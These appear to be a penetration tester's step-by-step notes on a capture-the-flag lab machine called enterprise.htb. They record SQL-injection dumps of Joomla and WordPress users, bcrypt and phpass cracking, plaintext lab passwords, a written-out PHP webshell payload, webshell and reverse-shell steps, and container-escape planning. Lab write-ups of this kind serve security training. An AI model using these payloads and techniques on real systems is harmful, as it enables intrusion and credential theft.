#    joomladb = 72 tables, prefix edz2g_ (random prefix defeated by info_schema enum)
#    -> edz2g_users = Joomla admin cred target

# 10. dumped edz2g_users: geordi.la.forge (Super User) + Guinan, both bcrypt $2y$10$
#     saved loot/joomla_users.hash ; hashcat -m 3200 (slow). geordi = Joomla admin target.

# 11. dumped Joomla edz2g_session -> ALL guest (JUser id:0) = dead end (decode confirmed)
echo '<b64 blob>' | base64 -d   # -> Joomla\Registry, user id 0, only a CSRF token

# 12. crack status: Riker phpass (-m 400) fast; geordi/Guinan bcrypt (-m 3200) ~8h ETA,
#     no early hit -> cracking NOT the intended path (§7.1). PIVOT to Joomla version.
# NEXT: curl http://enterprise.htb:8080/administrator/manifests/files/joomla.xml

# 13. Joomla version: /README.txt -> 3.7 branch. 3.7.0 = CVE-2017-8917 unauth SQLi.
curl -s http://enterprise.htb:8080/README.txt | head
#    NEXT: exact patch via joomla.xml; searchsploit joomla 3.7.
#    NOTE: already have SQLi (lcars, same shared DB) - is com_fields a forward move or lateral?

# 14. exact version: joomla.xml -> 3.7.5. CVE-2017-8917 fixed in 3.7.1 -> N/A.
#     Joomla admin walled off (uncrackable bcrypt + SELECT-only SQLi). Joomla path DEAD.
#     PIVOT: read edz2g_content/config for the 32812 code; locate the Python app.

# 15. **SQLi user is DBA** -> FILE priv -> file R/W from the DB
#     READ:  UNION SELECT LOAD_FILE('/etc/passwd')
#     WRITE: ... UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'
#     check SELECT @@secure_file_priv first. webroot /var/www/html (from lcars include).
#     -> webshell -> RCE in WP container. (INTO OUTFILE works despite SELECT-only injection.)

# 16. DBA privileges enumerated; @@secure_file_priv = '/var/lib/mysql-files/'
#     -> file R/W confined there (no webshell to /var/www/html, no LOAD_FILE /etc/passwd)
#     -> + SELECT-only injection = can't use INSERT/UPDATE/CREATE FUNCTION. DBA neutered.
#     -> SQLi = DATA READ only. mysql hashes (-m 300) also did NOT crack.
#     NEXT: read wp_posts / edz2g_content for the 32812 Bridge Access Code (plaintext?).

# 17. CONFIRMED webshell dead: sqlmap --file-write /var/www/html/shell.php FAILED
#     (secure_file_priv, not fs perms - don't try other dirs). backend Debian 8, PHP 5.6.31.
#     ACTIVE MOVE: SELECT post_title,post_content,post_status FROM wp_posts (incl private/draft)
#     -> hunt the 32812 Bridge Access Code in the "Ships Log" blog.

# 18. BREAKTHROUGH: wp_posts draft "Passwords" -> 4 plaintext strings (loot/found_passwords.txt)
#     -> THE custom wordlist (why rockyou failed on the bcrypt). now:
hashcat -m 3200 loot/joomla_users.hash loot/found_passwords.txt   # map pw->user
#     + try each at Joomla /administrator login (geordi=Super User), 32812, SSH.

# 19. cracked Joomla bcrypt with found_passwords.txt:
#     geordi.la.forge (Super User) : ZD3YxfnSjezg67JZ
#     Guinan                       : ZxJyhGem4k338S2Y
#     leftover (32812/SSH?): enterprisencc170, u*Z14ru0p#ttj83zS6
#     -> Joomla /administrator login as geordi -> Templates -> edit error.php -> RCE

# 20. cracked riker WP phpass: william.riker : u*Z14ru0p#ttj83zS6
#     ALL hashes now mapped. sole leftover password `enterprisencc170` -> 32812 code (elim).
#     nc 10.129.56.14 32812  -> enter enterprisencc170

# 21. 32812: tried all 4 found passwords -> ALL FAIL. code is NOT among them (elim guess wrong).
# 22. WP admin verified (william.riker : u*Z14ru0p#ttj83zS6).
# 23. RCE: WP-admin plugin editor -> webshell hello.php in /wp-content/plugins/
curl "http://enterprise.htb/wp-content/plugins/hello.php?cmd=whoami"
#     -> RCE in WP container. NEXT: reverse shell -> 9001, stabilize, P6/P6b.

# 24. /etc/passwd (from RCE) = system accounts only, NO human users -> CONTAINER confirmed.
#     SSH-reuse has no local target here. 32812/Python app live outside this container.
#     NEXT (P6b): hostname, /.dockerenv, /proc/1/cgroup, mount (bind-mounts!), ip a (host=.1)

# 25. reverse shell (payload A: bash -c + URL-encoded) -> caught on 9001.
#     container 172.17.0.4 / default bridge / host 172.17.0.1.
#     STABILIZE: python3/python -c 'import pty;pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null
#     P6b: id; hostname; ls -la /.dockerenv; cat /proc/1/cgroup; mount; env; ip a; ip route

# 26. container user.txt = DECOY ("Holodeck, not the Enterprise") -> real flags on HOST.
#     www-data@b8319d86d21e. ESCAPE needed. run: mount ; env ; id ; ip a ; find / -perm -4000

# 27. env LEAK (docker link): MYSQL_ENV_MYSQL_ROOT_PASSWORD=NCC-1701E (NEW cred!)
#     net: host .1, mysql .2, us .4. mount: /var/www/html <- host LVM (enterprise-vg-root, rw).
#     NEXT: try NCC-1701E at 32812 (nc), and host SSH. connect mysql root @172.17.0.2.

# 28. 32812 vs NCC-1701E -> Invalid. ALL 5 found passwords fail 32812. code != looted cred.
#     no mysql client in container. PIVOT: internal recon from the shell.
#     A) is /var/www/html shared with a host web service? (write marker, curl host .1 / :443)
#     B) bash /dev/tcp scan of 172.17.0.1/.2/.3 -> locate Python app + where 32812 lives

# 29. INSIGHT: 32812 code is HARDCODED in the LCARS service, not a looted password.
#     find the service from the shell (covers WP container fs + host /var/www/html mount):
grep -rIl "Bridge Access Code" / 2>/dev/null
grep -rIl "Library Computer Access" / 2>/dev/null
find / -iname '*lcars*' 2>/dev/null
#     -> read the service: (a) hardcoded code -> opens 32812, (b) what it does w/ right code (escape?)

# 30. escape recon: caps=0, /dev/mapper empty, debugfs fails, mount denied -> direct-disk DEAD.
#     32812 LCARS service NOT in this container (only WP plugin). reachable post-escape only.
#     NEXT: host :443 named vhost test (enterprise.local -> shared /var/www/html?):
curl -sk https://172.17.0.1/marker.txt -H 'Host: enterprise.local'
#     + /dev/tcp sweep .1/.2/.3 -> find Python app (Flask/SSTI) + 32812 location

# 31. HINT: escape is via the JOOMLA container (not WP). use geordi Super User (unused so far).
#     Joomla /administrator -> Templates -> edit error.php -> revshell -> Joomla container
#     then: mount -> find host-shared folder (/dev/mapper/enterprise--vg-root on /<PATH>)

# 32. joomscan: confirms Joomla 3.7.5, admin /administrator/, core not vulnerable (no new path).
#     RCE path is AUTHENTICATED (geordi Super User) -> template edit, not a scan finding.
#     -> login /administrator, Templates -> edit error.php -> revshell -> Joomla container -> mount
```
